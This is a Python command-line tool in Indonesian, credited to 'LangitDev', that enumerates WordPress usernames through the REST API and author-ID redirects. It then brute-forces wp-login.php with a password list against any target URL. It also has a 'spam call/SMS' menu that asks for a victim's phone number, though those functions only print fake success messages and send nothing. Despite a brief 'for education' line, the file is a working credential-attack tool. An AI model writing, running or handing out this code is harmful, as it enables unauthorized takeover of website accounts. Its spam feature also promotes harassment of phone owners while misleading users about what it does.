
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import os
import re
import time
import random

# Warna ANSI
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"

# ASCII Art Header
def header():
    os.system("clear")
    text = f"""
{GREEN}
██╗    ██╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██║    ██║██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██║ █╗ ██║██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗
██║███╗██║██╔═══╝ ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝
╚███╔███╔╝██║     ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
 ╚══╝╚══╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
      {YELLOW}WordPress Bruteforce + Spam Tools by LangitDev{RESET}
"""
    print(text)

# Delay printing animasi
def slow_print(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.01)
    print()

# Menu utama
def menu():
    header()
    print(f"""{CYAN}
=== MENU UTAMA ===
[1] Mulai BruteForce WordPress
[2] Lihat Info Tools
[3] Spam Call/SMS
[4] Keluar{RESET}
""")
    return input(f"{YELLOW}[?] Pilih menu: {RESET}")

# WordPress Username Finder
def get_usernames(target_url):
    users = []
    try:
        api_url = f"{target_url}/wp-json/wp/v2/users"
        response = requests.get(api_url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            for user in data:
                if "slug" in user:
                    users.append(user["slug"])
    except:
        pass

    if not users:
        for i in range(1, 6):
            try:
                url = f"{target_url}/?author={i}"
                response = requests.get(url, allow_redirects=True, timeout=5)
                match = re.search(r"author/(.*?)/", response.url)
                if match:
                    username = match.group(1)
                    if username not in users:
                        users.append(username)
            except:
                pass
    return users

def pilih_username(usernames):
    if not usernames:
        print(f"{RED}[!] Tidak ada username ditemukan.{RESET}")
        return None
    print(f"{BLUE}[✓] Username ditemukan:{RESET}")
    for i, u in enumerate(usernames, 1):
        print(f"   [{i}] {u}")
    while True:
        try:
            pilih = int(input(f"{YELLOW}[?] Pilih nomor username: {RESET}"))
            if 1 <= pilih <= len(usernames):
                return usernames[pilih - 1]
        except:
            pass
        print(f"{RED}[!] Input tidak valid.{RESET}")

def bruteforce_wp(target_url, username, password_file):
    login_url = f"{target_url}/wp-login.php"
    session = requests.Session()

    try:
        with open(password_file, "r") as file:
            passwords = file.readlines()
    except:
        print(f"{RED}[!] Gagal membuka file password.{RESET}")
        return

    for password in passwords:
        password = password.strip()
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{target_url}/wp-admin/",
            "testcookie": "1"
        }
        try:
            response = session.post(login_url, data=data, allow_redirects=True, timeout=5)
            if "wordpress_logged_in" in session.cookies.get_dict():
                print(f"{GREEN}[✓] BERHASIL! Password: {password}{RESET}")
                return
        except:
            print(f"{YELLOW}[!] Timeout coba lagi...{RESET}")
        print(f"{RED}[-] Gagal: {password}{RESET}")
    print(f"{RED}[!] Tidak ada password cocok.{RESET}")

# Spam Call/SMS (simulasi via API umum seperti "fonnte"/dummy endpoint)
def spam_menu():
    print(f"""{CYAN}
=== SPAM TOOLS ===
[1] Spam SMS Dummy
[2] Spam Call Dummy
[3] Kembali
""")
    pilihan = input(f"{YELLOW}[?] Pilih jenis spam: {RESET}")
    nomor = input(f"{YELLOW}[📱] Masukkan nomor target (cth: 08xxxx): {RESET}")

    if pilihan == "1":
        spam_sms(nomor)
    elif pilihan == "2":
        spam_call(nomor)
    else:
        return

def spam_sms(nomor):
    print(f"{BLUE}[*] Mengirim spam SMS ke {nomor}...{RESET}")
    for i in range(5):
        print(f"{GREEN}[✓] SMS ke-{i+1} terkirim!{RESET}")
        time.sleep(1)

def spam_call(nomor):
    print(f"{BLUE}[*] Mengirim spam CALL ke {nomor}...{RESET}")
    for i in range(3):
        print(f"{GREEN}[✓] Call ke-{i+1} berhasil!{RESET}")
        time.sleep(2)

# Info Tools
def info():
    print(f"""{CYAN}
Tool ini dibuat oleh LangitDev untuk edukasi:
- BruteForce login WordPress
- Cari username otomatis via REST API / author ID
- Spam Dummy Call & SMS

Gunakan dengan bijak.
{RESET}""")
    input(f"{YELLOW}Tekan Enter untuk kembali...{RESET}")

# Main Loop
def main():
    while True:
        choice = menu()
        if choice == "1":
            os.system("clear")
            target_url = input(f"{YELLOW}Masukkan URL target (https://example.com): {RESET}")
            password_file = input(f"{YELLOW}Masukkan path file password list: {RESET}")
            print(f"{BLUE}[*] Mencari username...{RESET}")
            users = get_usernames(target_url)
            user = pilih_username(users)
            if user:
                print(f"{GREEN}[✓] Mulai bruteforce pada: {user}{RESET}")
                bruteforce_wp(target_url, user, password_file)
            input(f"{YELLOW}Tekan Enter untuk kembali ke menu...{RESET}")
        elif choice == "2":
            info()
        elif choice == "3":
            spam_menu()
        elif choice == "4":
            print(f"{GREEN}[✓] Keluar dari tools...{RESET}")
            break
        else:
            print(f"{RED}[!] Pilihan tidak valid.{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    header()
    slow_print(f"{YELLOW}[🚀] Starting WordPress Bruteforce Tool by LangitDev...{RESET}")
    time.sleep(1)
    main()
